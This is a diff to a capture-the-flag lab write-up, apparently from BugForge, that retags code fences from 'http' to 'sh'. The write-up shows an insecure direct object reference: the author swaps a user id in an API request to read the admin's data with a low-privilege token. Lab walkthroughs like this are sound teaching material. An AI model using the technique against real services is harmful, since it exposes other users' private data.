@@ -25,7 +25,7 @@ Content-Length: 116
 ```
 
 Let's see what happens if we change the `{uid}` to that of another user. We can start with `1` since we know from our admin creds, that this is the uid of our Admin user.
-```http
+```sh
 GET /api/stats/1 HTTP/2
 Host: 30f8877689b2.labs.bugforge.io
 Sec-Ch-Ua-Platform: "Linux"
@@ -44,7 +44,7 @@ Priority: u=1, i
 ```
 
 And it looks like we can in fact access the study information of our Admin user with a low privilege users token. This get's us our flag.
-```http
+```sh
 HTTP/2 200 OK
 Access-Control-Allow-Origin: *
 Content-Type: application/json; charset=utf-8
